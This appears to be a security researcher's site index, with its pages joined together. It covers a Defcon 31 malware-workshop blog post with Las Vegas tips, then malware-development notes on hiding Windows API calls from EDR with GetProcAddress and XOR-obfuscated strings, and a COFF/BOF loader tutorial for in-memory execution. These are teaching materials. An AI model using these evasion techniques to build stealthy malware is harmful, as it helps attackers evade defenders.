Really ? You didn't know it was one of the most important cybersecurity conference happening in  Las Vegas every years where almost 40 000 people joined themselves on a common passion ? Now you do !\nThis year, I have been trusted by the Defcon committee to create and run a workshop on malware development. The workshop only took me 4 hours, so I had plenty of time left to browse everything the Defcon has to offer (and is freaking giant !).\nThis small post aims to highlight my personal point of view on this experience, and help Defcon newbie, like me, to take the plunge and join the Defcon family.\nThe Defcon\nDefcon is huge, you have a lot of things to do. Even if you are not in cybersecurity, you will surely find something to do and learn a lot of things !\nTalks, Wokshops, Villages, DemoLabs\nAt the Defcon, you will be able to go to talks, villages and demolabs. Each one is different and you should go to each of them cause they are complementary.\n\nTLTR: You can go to any talk but try to go to village and workshop on subject you want to discover\n\nTalks\nThe talks are the main event at Defcon. The format depends on the speaker, but it is usually 30-45 minutes long where the speaker(s) will talk about a specific technical subject. \nEven if you do not have any knowledge on the subject, feel free to go to any talk, usually speaker re-explain basic concepts in order to allow anyone to follow their talk.\nWhile 45 minutes is not enough to make you an expert on a given subject, it will help you to understand and discover new subjects, so feel free to go to any talk even if you are a newbie on the subject.\nFor example, I went to some ICS talks while I have hardly any knowledge about ICS technologies but it helps me to discover new concepts and open my mind on the basics of ICS pentests.\nExploiting OPC-UA in Every Possible Way\n\nWhat I liked about the talks I went to is that whatever I knew the subject or not, it always shows me new ways to approach cybersecurity problems and the different way of looking at things when I do some cybersecurity research and this is what is wonderful at Defcon. It may be the best place to brainstorm and discover new way of tackling problems.\nFor example, the following talk NoFilter - Abusing Windows Filtering Platform for Privilege Escalation give me ideas for my next research on Malware Development and how I could overcome different difficulties whome I meet regularly.\nWorkshops\n\nTLTR: You do things but you must register in advance. Depending on the level of preparation, it can be a top or a flop, but always interesting.\nRespect your instructor and the work they commited in their workshop by following their instruction and prerequisite.\n\nWorkshops are the most time-consuming activities in Defcon but the most rewarding.\nWhile talks usually take 45 minutes, workshops can take up to 4 hours but the goals are different.\nIn the workshops you will do things by yourself instead of looking at someone explaining obscure things without being able to ask a lot of questions and put explained concepts in practice. \nFor example, if you go to a malware development workshop you will likely need to develop a malware by yourself (using pre-defined activities) and you will be able to interact with the instructor if something is not well understood.\nWorkshops are usually interesting to discover a subject and are, I think, the best way to dive into a specific topic. \nIf you already master a subject, be sure that the workshops you choose are adapted to your technical level or you could waste 4 hours. If you are an expert on the subject, you will likely don't learn anything new. Likewise, if you are a newbie and go to an advanced Workshop, you will be lost and it will be hard to learn anything.\nImportant point, you must sign up to the workshops ! Before the Defcon, you must register through EventBride to get your place to the workshop you want. In less than 30 minutes, all places are gone...\nAs a student\nThe most important rules when you go to a workshop are the following ones:\n\nTLTR: Don't be too lazy to read. \nIf your workshop instructor took time to prepare some prerequisites, read them and make sure to comply with them. With a class of 30-40 people, he can't take time with your specific setup.\n\n\nEnsure that you have downloaded all the prerequisites for your workshop: if the workshop asks for a Windows OS, install a Windows system, don't come with a  MAC or a Kali. If you think you will gain Internet points because you are using an obscure OS don't. Use the  VM given by the instructor.\nEnsure that your technical level is coherent with the one asked by the workshop. If your technical level is too high, you will be bored, on the other hand, if your technical level on the subject is too low, you will be lost...\nDo not expect the workshop instructor to help you deploy your personal setup if a predefined setup has been sent through an OVA. With a class of 30 persons, it is not possible to help everyone with their specificities\nCome with a freaking computer ! (not a joke, some people come to Defcon workshop without a computer.... Bru, it's like going to a third date without a condom...)\n\nThese rules are really important cause it could ruin your workshop experience and impact other participant as the instructor will likely spend time helping you to debug instead of going on it is presentation. \nFor example, at my workshop, 33% of people didn't bother to read and install the technical prerequisite pior to the workshop leading to a waste of time on debugging (I'm not judging as I am also the kind of person coming with my hand in my pockets).\nLikewise, some trouble can be inherent to the instructor, if you go to a workshop using cloud technology and the Defcon WIFI crashed, you will not be able to do anything on the workshop. In this case, don't be angry against the instructor, he surely is as pissed as you are (yep, it happened to me and some of my colleagues, nothing is worst than this...).\nIn a nutshell: be a human being.\nAs an instructor\n\nTLTR: Be prepared to anything when you build your workshop. Your workshop will never be as you expected.\n\nIf you want to do a workshop next year, be prepared to any scenario. You should prepare activities to do when Wifi does not work, when people do not install your prerequisite, when 75% of your attendant did not match the technical prerequisite or if a freaking comet destroyed the earth 5 minutes before your workshop. \nBE PREPARED TO ANY SCENARIO because the only one you didn't think about will happened. In France, it is called La loi de l'emmerdement maximal (Murphy's law).\nIn this, I think Workshop is the most time-consuming activity to prepare but can also be the most rewarding.\nVillages\nVillages are some specific areas in Defcon focus on a specific subject.\nThe following villages were present at Defcon 31:\n\nRedTeam Village\nCloud Village\nPhysical Intrusion Village\nOSINT Village\nMisinformation Village\nAppSec Village\nICS Village\nBiohacking Village\nCar hacking Village\nAerospace Village\nHardware hacking Village\nAnd some other I forgot\n\nEach village is specialized in a specific subject where you will find specific activities, workshop, demo and talks related to the subject.\nSome villages can be accessed quite easily, but the hyped one such as the cloud and RedTeam are not accessible to everyone. You will have to come early in the morning in order to sign up to the different activities.\nFor the RedTeam village, I had to wait 1 hour in the morning to be able to access to a single 45 minutes’ talk.\nMy advice is to not go on villages you are specialized on. If you spend your day doing  RedTeam, you will likely not learn a lot of new stuff on the RedTeam village. But it is still a nice opportunity to be reassured on your technical level.\n\nThis advice is quite valid for anything at Defcon. Do not expect to learn new things on the subject you already mastered but use the opportunities to learn new things on subject you never learned.\n\nOn my side, I spent most of my time on the ICS Village cause it is a subject I never really wanted to dig off and thought it was a nice opportunity to dive into.\nDemolabs\nNot so much to say about it as I didn't go to any of it.\nDemoLabs are short presentation on a specific tools. It is usually new tools with wonderful features.\nLive the Defcon\nCeasar forum\nThe Ceasar Forum (which is not the Ceasar Palace Hotel) is the main Defcon place.\nIf you didn't get your badge online, you will need to get here at the beginning of the event in order to buy your badge ($440 in cash for Defcon 31).\nAll the Defcon talks take place here on one of the differents tracks (a track is only a specific room).\nLikewise, the Demolabs, are hosted in the Ceasar Forum.\nFinally, some Villages are hosted at the Ceasar Forum. If it is the first time you come to Defcon you must definitely go here first. The majority of the content is displayed at the Ceasar Forum.\nThe most important : Merchandizing. If you want some Defcon goodies (hat, shirt, bags), you will be able to find it here but be prepared to wait a lot of time: The first day, at 9h30, there was a 4-5h queue. Nice thing to know is that badge does not seems mandatory to buy merchandazing. So it could be interesting to go to the merchandizing before buying your badge.\nThe Flammingo\nThe Flammingo hosted the different workshop as well as some Villages such as the  RedTeam village or the Cloud Village.\nThe Defcon is dangerous cause everyone wants to hack you\nBru, I will not spend a lot of time on this.\nHackers coming to Defcon are usually not malicious. At most they are pranksters. If you lock your computer and don't click to anything suspicious, you should be ok. The most dangerous place must be the restrooms because of the  Vegas high-fat diet...\nYes, some people on Twitter keeps saying you need a burner phone, computer and underwear... You will also be able to make your own tinfoil hat in the Defcon chill room if you think you are interesting enough that anyone would trash a 0-day to hack you.\nMy Workshop\nOne of my year goals was to present some subject at different conferences including Defcon. While being accepted for a talk can be challenging, Workshop seemed to be the most convenient way to get this experience.\nSubject\nThe workshop subject was malware development. The goal was to start with a basic process injection malware and understand how it works through the use of a debugger and sysinternals all along the way.\nThen, an EDR is used to understand the IOC detected by the blue team and how it could be possible to bypass them.\nSo the workshop was based on an iterative way to develop malware, understanding the IOC to be able to bypass them.\nFor that, I created several codes that participant could arrange to create the malware with the different techniques explained in the theoretical part right before.\nTroubles\nI spent a lot of time developing each code snippet and make them accessible by any person with basic C and Windows knowledge.\nLikewise, I spent a lot of time to design a  VM that will be easily embedded in a an EDR fleet without needing additional actions by the participants.\nHowever, it looks like that participants usually forget to download and install the prerequisite which leads to a shift in the planning. But I cannot put all the problems on the participant backs.\nWhile the code seems to be freestanding for me, it seems that it was too much to handle for anyone discovering the subject. Indeed, even if all the code has been already developed, it is too much information to be processed at once. Thus participants were kinda lost during the hands-on parts and this is fully on me.\nFinally, the main problem is the Wifi, during the Workshop, the Defcon WIFI failed. Thus every part related to the use of MDE EDR (a cloud solution) could not be done. Likewise, if any tool was missing (such as python) it was not possible for the participant to easily download them.\nAll these troubles ended with me doing the presentation and explaining the different concepts instead of the participant learning them by themselves.\nThis was for me the most frustrating part: I spent several weeks trying to do something freestanding that anyone could do by just reading the code and could enjoy doing by themselves and finally, they had not been able to write anything...\nThe nice part is that cause the code was freestanding, they still can use it at home and take time to understand things by themselves but it kinda broke the idea of a Workshop...\nFor my next Workshop\nWhile the workshop didn't work as I dreamed of, I will likely try to give another one next year. Here is the conclusion of this first experience to avoid making the same mistake I did.\nDon't do something to long\nWhen I present a subject, I always want to spend time on every aspect of the subject. While it can be interesting, it makes the workshop too complex and hard to follow.\nIf you want to make a workshop, try to focus on only a single subject or it will be too long or too dense to be absorbed in 4 hours.\nBe (more) prepared\nI always say it several times now, but for the next time I will take any possible scenario into account. This time I hopped that everything would be flawless (ahah, rookie move).\nFor next time, I will prepare additional activities that can be replaced depending on the situation (live demo if wifi failed, cloud instances if no-one download their  VM etc...)\nChange the way I deploy the setup\nWhile  VM is nice cause everyone will have the same setup, depending on the OS the participant uses (yes, even if a Windows OS is asked, be sure that 33% will come with a  MAC, ArchLinux, Kali etc...), the  VM deployment can fail (espacially on MAC).\nFor the next time, I will try to use cloud instances with web interface (Guacamole for example). Therefore, I will be sure that everyone will be able to access to a  VM even if they come with an iPad.\n4G modem as backup\nAs you can see, I have Wifi PTSD... \nNext year I will invest in a 4G modem to ensure that it will be possible to access to Internet whathever happen to the Defcon infrastructure.\nLas Vegas\nThe Defcon takes place at Las Vegas. So once you have decided to take your ticket for the Defcon, you still have to handle a week (or 3-4 days) in Vegas.\nSleep\nIf you are a speaker, this is handled by the Defcon for you. You will have a 4-night stay fully paid by Defcon. This year, for example, it was at the Flammingo. Otherwise, you are by yourself.\nThe majority of  Vegas hotels are quite kitsch and/or old-fashioned. But some are better than others. Here is my personal opinion on the hotels I used or the feedback from my colleagues.\nHorseshoe\n\nTLTR : Nice hotel if you only want to sleep and go to the casino. You should not be afraid by unsterilized rooms.\n\nThe Horshoes hotel is on the strip, right in front of the Flammingo hotel where the Defcon workshops and villages have been dispensed. This is I think the only benefits for this hotel.\nThe room I got was quite old but the bedding and the shower were ok. The complex offers a small fitness room and a pool. The pool is large and not so noisy regarding to other hotels but it is closed at 5pm. The fitness room contains the main equipment to avoid gaining 50Kg of fat during your stay and close at 8pm.\nHowever, the cleaning service leaves much to be desired, I found trash in front of my door and I even get several unwanted and unexpected flatmates:\n\nThe Flammingo\n\nTLTR : Closed to Defcon but old room, really noisy and they keep exotic animals against their will\n\nThe Defcon paid me 4 nights at the Flammingo. \nThis hotel is used to host a workshop and some villages and it is really closed to the Ceasar Forum so it is perfect if you want to be closed to the Defcon events.\nHowever, the room I got was really old and the bathroom is antique but the bedding was really comfy. Moreover, it starts to be really noisy from 2PM to 6PM due to the pool parties. So if you want to relax in your bedroom, it may not be the best hotel.\nThe no part for me is the fact that they keep exotic animals in their garden for entertainment but it is a personal point of view... I would have wanted to know that prior to accepting the reservation in this hotel.\nTuscanny\nI didn't go here, but I hear it is better than the Horseshoe and Flammingo\nLuxor\nYou sleep in a freaking pyramid !\nDidn't go thought but the Titanic exposition is interesting !\nEat\nThese are the few restaurants I went during my stay.\nYard House (LINQ promenade)\nRestaurant with a lot of choices from standard burgers to healthy poke.\nEverything I ate here was good.\nPub 365 (Tuscanny - Strip)\nEverything is good but they must work on the meal size. One meal could satisfy 3 people.\nThe tacos are spicy but really good. The Licorn Burger is freaking giant and do not take the sammies if you think it will be healthier: it is not.\nThe beer menu is impressive even if they do not have their 365 beers in stock you will likely find the hopped beverage you want here.\nAlexa's (Strip)\nThe best breakfast I got during my stay in Vegas. Not too expensive, and meals are good (do not take the meat omelet and you should be ok).\nIf you want to eat a classic American breakfast, you should be happy with this place.\nMaxie's (LINQ promenade)\nA place to make your calories go up without getting your wallet going down.\nNot good, and not bad for a breakfast, but it was the only meal I ate in the day.\nSushi Burritos (LINQ promenade)\nMaybe the most healthy meal I ate during my stay in Vegas.\nIt is just a giant maki or a standard pokeball.\nTrattoria Reggiano Italian Restaurant (Eataly - Strip)\nItalian restaurant in the Eataly foodcourt. A little bit expensive but the atmosphere is nice and the meals are good.\nIt is possible to take some drink at the Vine bar before going to the restaurant.\nCanonita (Venitian)\nA mexican restaurant really good in the Venitian casino. \nTook 2 picked of Magarita, no regrets.\nDrink\nBrewdog\nThis is a rooftop bar closed to the MGM Grand. You will have a beautiful view on all the strip while drinking your favorite beer. \nIt also offers beer flight if you prefer to test several beers.\nHowever, you can only enjoy the view if you also have your dinner here. Otherwise, you will have to drink at the bar which does not offer a direct view on the strip.\nEataly - Strip\nIf you are more in wine than beer, you still can enjoy your glass of vine after a day of conferences at Eataly foodcourt.\nYou can also take a vine flight to test three different types of vine. It is not cheap but it change from standard bar.\n"},"Malware/Docs/Code snippet.html":{"url":"Malware/Docs/Code snippet.html","title":"Code Snippet","keywords":"","body":"Code snippets\nTable of

EDR can collect the function used by the process and compare them to a list of well known functions used by malware.\nThe goal of function call obfuscation is a way of hiding DLL and functions call that will be used during runtime.\nWindows API\nGetModuleHandle\ndllHandle = GetModuleHandle(\"file.dll\")\n\nReturn a handle to the specified DLL\nGetProcAddress\nfunction = GetProcAddress(dllHandle,  \"functionFromDll\")\n\nGet the memory address of the function you need and that is exported from the DLL\nHands on\nStep 1 : making VirtualProtect disappear from the dumpbin output\n\nFind declaration of VirtualProtect :\nUse Google and MSDN documentation.\n// Declared in Kernel32.dll\nBOOL VirtualProtect(\n[in]  LPVOID lpAddress,\n[in]  SIZE_T dwSize,\n[in]  DWORD  flNewProtect,\n[out] PDWORD lpflOldProtect\n);\n\n\nIn the code declare a new global variable  :\n// It will store the address to `VirtualProtect`\nBOOL (WINAPI * pVirtualProtect)( LPVOID lpAddress, SIZE_T dwSize, DWORD  flNewProtect, PDWORD lpflOldProtect)\n\n\nRetrieve the address ::\npVirtualProtect = GetProcAddress(GetModuleHandle(\"kernel32.dll\"), \"VirtualProtect\")\n\n\nCall the function from the created handler :\nrv = pVirtualProtect(exec_mem, calc_len, PAGE_EXECUTE_READ, &oldprotect);\n\nConclusion :\nThe VirtualProtect function is not list when dumpbin is used. However, the VirtualProtect string is still here in the code strings.\n\n\nStep 2 : Making every reference of VirtualProtect disappear\n\nXOR all string containing VirtualProtect :\nThe problem is your key will be easily spot using the Strings Sysinternals or with some reverse engineering\n\nUse one of the binary string as the XOR key :\nString the binary and choose one of the string as the key. Thus, if someone also string the executable, the key will not be easily spoted.\n\nConclusion : \nThe VirtualProtect does not appear on dumpbin /imports file.exe and does not also appear when the executable is stringed.\n\n\n"},"Malware/EDR/TrendMicro.html":{"url":"Malware/EDR/TrendMicro.html","title":"TrendMicro","keywords":"","body":"TrendMicro\n\n\nDetections\nHooks\nHooks detections\nUnhooking\n\n\nETW\nDrivers\n\n\nCloud console\nEndpoint alerts\n\n\n\n\nDetections\nHooks\nHooks detections\nTrendmicro seems to use several hooks to perform userland detection.

Likewise, the object files generated during compilation and the shared libraries follows the same format.\nThe goal of this article is to dive into the COFF format to understand how it can describe a full executable file. Then, the Windows object files will be analyzed to finally lead to the development COFF Loader: a program that can run a Windows object file in memory.\nA COFF Loader is a program taking as input an Windows object file and execute it as a standard executable file. This technic is often used by malware as the program will only exist in memory, limiting the malware footprint. Moreover, because the program is fully executed in memory, it will be harder for detection solutions such as anti-virus or EDR to detect it and prevent its execution.\nPortable Executable (PE)\nStore data in a PE\nPE is a format used by the Windows executable.\n┌──(pikachu㉿Kali)-[~/Share]\n└─$ file windowsExecutable.exe \nwindowsExecutable.exe: PE32+ executable (console) x86-64, for MS Windows\n\nThe PE is structured as a book. Indeed, the PE has a global header that contains information about itself such as a book cover and all the data is organized in chapters called sections. All sections get their own header. \nEach section goal is different and they are used to organize all the data needed for the program proper functioning.\nPE files can be inspected through several tools such as CFFExplorer.\n\nAs it is shown in the previous figure, the PE is organized in different sections:\n\n.text : this section is used to store the executable code.\n.bss : this section is used to store any uninitialized global variable. Thus, if you use the statement int a; outside of any function or module, this variable will likely be stored in the .bss section. As all data are uintialized, this section is always empty. It is generated and populated at runtime.\n.data : this section is used to store initialized global variable. If in your code you have the statement int a = 5; outside of any function or module, this information will be stored in this section.\n.rdata : this section is used to store initialized read-only global variable. These variables will not change during the whole program execution. For example, the statement const int a = 5; outside of any function or module will likely end in the .rdata section.\n.pdata : this section is used to store the functions used for error handling. This section contains all the information needed to unwind the stack when an exception is raised. Its content is really interesting to implement Thread Stack Spoofing.\n.xdata : this section is used to store the .pdata exception information.\n.idata : this section is used to store the import directory table that is used to store the addresses used during DLL loading.\n.reloc : this section is used to store relocation information. When a program is compiled, the compiler choose a base import address. This address is the one where the program will be loaded in memory. But if this address is already used, the OS will load it at another random address not known during compile time. This load address shift will break references to symbols that use absolute address. Indeed, if a symbols is supposed to be located at baseAddress + 0x10, the base address shift will break the reference. The .reloc section contains all the information needed to easily relocate these symbols depending on the executable load address.\n\nReference to functions and variables during execution\nThe PE contains all the data needed to run the program. The .text section contains the executable code but usually all variables or functions are contained in other sections. Thus, during execution time, the code must be able to find these references ie, it must be able to find the address of the symbol in its definition section.\nFor example, the following C code:\n#include \nchar myVariable[16] = \"Hello World !\\n\";\nint main(void){\n    printf(\"%s\", myVariable);\n}\n\nOnce decompiled during execution, the main function looks like this :\n00007FF7390B187B  lea         rdx,[myVariable (7ff6c959c000h)]  \n00007FF7390B1882  lea         rcx,[string \"%s\" (7ff6c9599c24h)]  \n00007FF7390B1889  call        printf (7ff6c959118bh)\nFollowing the standard x64 argument convention, the two printf arguments are stored in RDX and RCX.\nLooking at the memory mapping using vmmap or ProcessHacker, the following section mapping is performed:\n\nThe section with RX rights is the .text section.\nWhen the PE is loaded in memory, the sections are mapped in the same order they are defined in the PE :\n\n.text :  0x7ff6c9591000\n.rdata:  0x7ff6c9599000\n.data :  0x7ff6c959c000\n\nOpening the section .data displays the myVariable value that is Hello World!.\nThus, when a global data is used in C, the compiler will store the data in the .data section and replace each use of the data by its address in the ASM generated code.\nThe same analysis can be done with the following code :\n#include \nconst char myReadOnlyVariable[16] = \"ReadOnly \\n\";\nint main(void){\n    printf(\"%s\", myReadOnlyVariable);\n}\n\nThis time, due to the use of const the variable will be located in the .rdata section.\nSo, when a C code is compiled and linked, the ASM generated code is located in the .text section, the variables, functions and libraries are located in the other sections depending on their uses. Finally, the .text section is modified to point on the right section each time a variable or a function is referenced.\nUsually, the .text section does not contain any data but just references (addresses) to the section containing the data. This behavior can be tweaked through compiler and linker option but we will just sticking up to the general case.\nObject files\nOverview\nObject files are binary files generated during a program compilation. The generated object files are then linked to generate the PE executable:\n\nThe compiler transforms the source code into object files. These files contain exactly the same amount of information the source code has but cannot be understood by the OS. Moreover, the compilation generate symbols that represent the variable but these symbols do not point to anything.\nFor example, if one variable is defined in the file1.c but used in the file2.c, and the file2.o file is \"executed\" by the OS it will not be able to find the variable defined in file1.c and the \"program\" will crash.\nFor example, the following code:\n// file1.c\nchar myVariable[16] = \"Hello World !\\n\";\n\n// file2.c \nextern char myVariable[16];\nint main void(){\n    printf(\"%s\", myVariable);\n}\n\nOnce disassembled, the main function contained in file2.obj looks like:\n  000000000000001B: 48 8D 15 00 00 00 00  lea         rdx,[myVariable]\n  0000000000000022: 48 8D 0D 00 00 00 00  lea         rcx,[??_C@_02DKCKIIND@?$CFs@]\n  0000000000000029: E8 00 00 00 00        call        __imp_printf\nInstead of getting addresses, as for full compiled PE, the Object File uses symbols.\n\nmyVariable is the symbol that represents the variable myVariable defined in file1.c\n??_C@_02DKCKIIND@?$CFs@ is the symbol that represents the %s\n__imp_printf is the symbol that represents the printf function.\n\nAs it can be seen the object file contains all the symbols, but if the raw bytes are analyzed, the address that should point to the symbol is empty (0x000000). Thus, the object file cannot be executed as a PE.\nMaking the cross reference between object file and generating the address of each symbol is the linker job.\nDuring the compilation time, the variables and functions defined in the source code are transformed into symbols in the object files. The linker will then process the symbol of each object files, cross reference them, generate the address and build the executable.\n\nOn the previous example, the linker will map all the file1.o symbols and give them an address in the file. Then, it will map all the symbols of file2.o and resolve the external symbol myVariable to its definition address defined during the file1.o mapping.\nCoff Loader\nA COFF Loader is a program that will take an object file as input, will resolve all symbols to make it executable by the OS, store the symbols in memory and run the program described by the object file in-memory. \nThus a COFF Loader is more or less a mini-linker that will perform in-memory linking and execution.\nFor now, each time the word COFF is used, it will designate a Windows object file. Likewise, the BOF name can also be used.\nBOF or COFF ?\nA COFF Loader is implemented is Cobalt Strike. The COFF used are modified program integrating functions that can interact with the CobaltStrike beacon enhance the name Beacon Object File or simply BOF. For instance, if you run the COFF wohami.o, the answer will be prompted to the standard stdin thus, will not be retrieved by the beacon and the operator will not be able to see the output.\nThe fix this problem, the whoami.o COFF support some functions that can be used to talk with the beacon and send back execution output to the operator.\nBOF advantages\nSeveral technics can be used to execute binary in-memory. For example C# inline assembly,  C++ ReflectiveDLL or Powershell IEX. However, these technics are based on a forkNrun pattern that involves process creation and process injection. They can be detected by security solutions as they let an important in-memory footprint and use heavily monitored WindowsAPI such as OpenProcess, WriteProcessMemory or CreateRemoteThreadEx. \nOn the other hand, BOF can be executed in the current process and all the memory allocated can be cleaned after execution. Thus, its memory footprint is very small and its detection harder.\nFinally, the BOF generated executables are smaller and thus easier to be sent to the beacon over the network. For example, the whoami.exe executable size is 72kB, the BOF version is less than 7kB.\nBOF disadvantage\nEvery techniques have their advantages and drawback. \nThe main disadvantage of BOF is they share the same process as the beacon. Thus, the beacon cannot make any other actions while the BOF is executed.\nLikewise, if the BOF crashes during its execution, it will also kill the beacon.\nFinally, even if BOF development is not really difficult, they must be singled threaded and the whole code must be written in a single file. Thus, it can be hard to create an advanced application using only BOF. \nFor example, creating a BOF version of Rubeus or Mimikatz can be quite challenging (but if you have one, please share it with me...)\nHands on : COFF Loader\nBlueprint\nIn order to develop the COFF Loader , the following tasks must be tackled down:\n\nParse the COFF file according to the COFF specification\nRetrieve the COFF sections and map them in memory\nResolve symbols and modify the sections to set the right reference address in the sections\nResolve the external functions (such as printf) to set the right address in the sections\nRetrieve the section containing the executable code\nRun the code\n\nCOFF specification\nA first approach of COFF specification has been seen in the PE part. However, COFF specification for PE and for Object File are similar but not identical.\nIndeed, the principle is the same, the COFF file is a book and is segmented in different sections. Among these sections there are the .text, .data, .rdata etc... with the same definition as those for the PE. However, the data contained in each section header is quite different. Moreover, other new parts are added. \nThe COFF specification for Object File contains a Symbol Table that summarizes all symbols used and a Symbol String Table that contains the name of each symbol.\nLikewise, there is not any .reloc section in COFF file but there is a Relocation Table that contains all the information needed to resolve symbols, compute their address and modify the sections' code to fix symbols references.\nThe following figure summarizes the structure of a COFF file:\n\nCOFF Header\nThe COFF header specification can be found here in the Microsoft documentation.\nThe file header starts at the offset 0. The following C structure can be used to handle the COFF header:\ntypedef struct _CoffHeader {\n    uint16_t    machine;\n    uint16_t    numberOfSections;\n    uint32_t    timeDateStamp;\n    uint32_t    pointerToSymbolTable;\n    uint32_t    numberOfSymbols;\n    uint16_t    sizeOfOptionalHeader;\n    uint16_t    characteristics;\n} CoffHeader;\n\nThe machine value is a number defining for which architecture the COFF file have been compiled. For example, the value 0x8664 represents an x64 architecture.\nThe value pointerToSymbolTable is the offset of the symbol table. Thus, the header can be used to directly jump to the Symbol Table :\n// pseudo code\n// void *data : address of the first COFF byte\n\nCoffSymbol* firstSymbol = data + coffHeader.pointerToSymbolTable;\n\nThe optional headers are empty on a File Object COFF structure.\nThe characteristic value represents the COFF type and its possible values are resumed in the Microsoft documentation.\nSections Header\nRight after the file header, there are the section headers. These headers contains all the information needed to access the data contained in the different sections.\nThe specification about section headers can be found here in the Microsoft documentation.\nThe following C structure can be used to handle the sections header :\ntypedef struct _CoffSection {\n    char        name[8];\n    uint32_t    virtualSize;\n    uint32_t    virtualAddress;\n    uint32_t    sizeOfRawData;\n    uint32_t    pointerToRawData;\n    uint32_t    pointerToRelocations;\n    uint32_t    pointerToLinenumber;\n    uint16_t    numberOfRelocations;\n    uint16_t    numberOfLinenumber;\n    uint32_t    characteristics;\n} CoffSection;\n\nThe name value is the section name (.text, .data, etc...). Not so much to say about it.\nThe virtualSize and virtualAddress values are always set to 0 in COFF file as they are meant to contains the data once the PE is loaded in memory.\nThe pointerToRawData data is the offset used to access to the data contained in the section. For example, if the section is the .text section, pointerToRawData data will point to the first executable bit. The value is absolute (ie from the byte 0 of the file) and not relative from the section (ie from the section address).\nThe pointerToRelocations data is the offset used to access to the Relocation Table linked to the section (see the next part about relocation). As for the pointerToRawData, the offset is absolute and not relative.\nThe pointerToLinenumber is usually 0 or can be ignored as this field is deprecated in COFF compilation.\nNavigate into sections\nDuring the COFF file parsing, it will be needed to navigate through the different sections. This can easily be done by leveraging the following facts :\n\nThe total number of sections is given in the file header\nThe first section header is located right after the file header\nThe size of the file and section headers are constant and known\nThe different section headers are stored in a continuous way\n\nThus, to access to the section i the following pseudo-code can be used:\n// pseudo code\n// void *data : address of the first COFF byte\nCoffSection* section_i = data + HEADER_SIZE + i * SECTION_SIZE\n\nRelocations Table\nThis table contains all the information needed to resolve symbols and modify the segment code to inject the symbol address.\nOnce again, as an example, the following code is used:\nint main(void){\n    printf(\"Hello World !\\n\");\n}\n\nThe decompiled code stored in the Object File .text section is the following:\n.text\n  000000000000001B: 48 8D 0D 00 00 00 00 lea         rcx,[??_C@_0M@KPLPPDAC@Hello?5World@]\n  0000000000000022: E8 00 00 00 00       call        __imp_printf\nThe addresses contained in the section are 0x00000000. If the .text section is loaded in memory as-is and run, the program will try to access to the address 0x00000000 and will crash.\nThus, a relocation must be performed to replace the fake symbol address by the real one.\nOn this example, two relocations must be performed : the ??_C@_0M@KPLPPDAC@Hello?5World@ and the __imp_printf.\nThus, two entries will be present in the .text section relocation table.\nThe following C structure can be used to handle each relocation entry:\ntypedef struct _CoffReloc {\n    uint32_t    virtualAddress;\n    uint32_t    symbolTableIndex;\n    uint16_t    type;\n} CoffReloc;\n\nThe virtualAddress value is the relative offset from the section start to the first byte of the address to modify.\nIf the .text section contains only these two lines :\n  000000000000001B: 48 8D 0D 00 00 00 00 lea         rcx,[??_C@_0M@KPLPPDAC@Hello?5World@]\n  0000000000000022: E8 00 00 00 00       call        __imp_printf\nThe virtual address for the relocations will be 0x03 and 0x08.\nThe symbolTableIndex value contains the index of the symbol in the Symbol Table. This value is used to retrieve information about the symbol that must be relocated in the section.\nThe type value is the relocation type ie the way the symbol address must be given in the section. These codes are dependent of the architecture. Only the interesting codes for x64 will be explained.\n\n\n\nName\nValue\nDescription\n\n\n\n\nIMAGE_REL_AMD64_ABSOLUTE\n0x0000\nThe relocation is ignored\n\n\nIMAGE_REL_AMD64_ADDR32\n0x0001\nThe symbol reference address in the section must be replaced by the 64bits absolute address of the symbol.\n\n\nIMAGE_REL_AMD64_ADDR64\n0x0002\nThe symbol reference address in the section must be replaced by the 32bits absolute address of the symbol.\n\n\nIMAGE_REL_AMD64_ADDR32NB\n0x0003\nThe symbol reference address in the section must be replaced by the 32bits relative address of the symbol from the current section\n\n\nIMAGE_REL_AMD64_REL32\n0x0004\nThe symbol reference address in the section must be replaced by the 32bits relative address of the symbol from the current section minus an offset of 0 bits\n\n\nIMAGE_REL_AMD64_REL32_1\n0x0005\nThe symbol reference address in the section must be replaced by the 32bits relative address of the symbol from the current section minus an offset of 1 bits\n\n\nIMAGE_REL_AMD64_REL32_2\n0x0006\nThe symbol reference address in the section must be replaced by the 32bits relative address of the symbol from the current section minus an offset of 2 bits\n\n\nIMAGE_REL_AMD64_REL32_3\n0x0007\nThe symbol reference address in the section must be replaced by the 32bits relative address of the symbol from the current section minus an offset of 3 bits\n\n\nIMAGE_REL_AMD64_REL32_4\n0x0008\nThe symbol reference address in the section must be replaced by the 32bits relative address of the symbol from the current section minus an offset of 4 bits\n\n\nIMAGE_REL_AMD64_REL32_5\n0x0009\nThe symbol reference address in the section must be replaced by the 32bits relative address of the symbol from the current section minus an offset of 5 bits\n\n\n\nOther relocation types exist and are referenced in the Microsoft documentation but they are hardly ever used or only for debugging purpose.\nThus only these relocation types will be handled here.\nAbsolute and Relative address\nIn the relocation description, the term absolute and relative address is used. Depending on the relocation type, one or the other must be computed.\nThis part aims to explain the difference between absolute and relative address.\nThe following example could help to see the difference between these two address types.\n\nMichel TheHacker lives in a very small city with only one street. The street is one way and Michel lives in the 50th house. \nWhen he gives his address to a stranger, he always count the number of houses between his and the beginning of the street. His address is then 50. This is called absolute address. \nHowever, when he gives his address to one of his friends living in the same street, he always gives the number of houses between his house and his friend house. Thus, for Robert, a Michel friend, living in the house 12, Michel’s address is 38 as there are 38 houses between his and Michel one's. This is called relative address.\n\n\nIn a nutshell, an absolute address allows anyone to reach the destination while a relative address allows only one person to reach the destination.\nWith COFF file, the same principle can be applied. THE symbol absolute address is its address from the file start. A symbol relative address is its address from a given position in the file (the relocation address for example).\nThe following figure can help to visualize how to compute the relative addresses :\n\nKnowing that, when a relative address is needed, the following formula can be used to compute the symbol relative address of a symbol from a section start:\n// Compute the relative address of a symbol from a given section\nRelativeAddress(Symbol) = AbsoluteAddress(Symbol) - AbsoluteAddress(Section)\n\nThe absolute address can be easily computed with the following formula:\nAbsoluteAddress(Symbol) = AbsoluteAddress(SymbolTable) + Offset(Symbol in SymbolTable)\n\nThese addresses can then be written in the corresponding section.\nSymbol Table\nThis table contains all the data related to the symbols. It includes their name, type and storage addresses.\nThe following C structure can be used to handle each symbol entry:\ntypedef struct _CoffSymbol {\n    union {\n        char        name[8];\n        uint32_t    value[2];\n    } first;\n    uint32_t    value;\n    uint16_t    sectionNumber;\n    uint16_t    type;\n    uint8_t        storageClass;\n    uint8_t        numberOfAuxSymbols;\n\n} CoffSymbol;\n\nThe first value is a union. It can handle two types of data depending on the symbol:\n\nThe symbol name is fewer than 8 characters : the first.name value will contain the name of the symbol\nThe 